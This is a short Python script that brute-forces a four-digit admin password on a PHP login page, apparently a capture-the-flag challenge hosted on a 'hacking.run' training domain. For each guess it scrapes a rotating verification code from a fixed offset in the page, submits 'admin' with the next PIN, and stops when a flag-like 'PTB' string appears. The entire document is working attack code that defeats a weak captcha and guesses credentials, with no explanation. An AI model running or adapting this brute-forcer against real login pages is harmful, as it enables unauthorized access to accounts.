import requests
import time

url = "https://1360-860a478d-2009-41c4-986b-1f2cd3bd1249.do-not-trust.hacking.run/index.php"
cookies = {'PHPSESSID': 'b5013f3f18e33d9c6a4bb548110efbdd'}

for i in range(509,9999):
    r = requests.get(url, cookies=cookies)
    code = r.text[383:388]

    params = {
        'username': 'admin',
        'password': f"{str(i).zfill(4)}",
        'randcode': code
    }
    print(code)
    r2 = requests.get(url, cookies=cookies, params=params)
    time.sleep(0.1)
    print(str(i).zfill(4))

    print(r2.text)

    if "PTB" in r2.text:
        print(r2.text)
        break
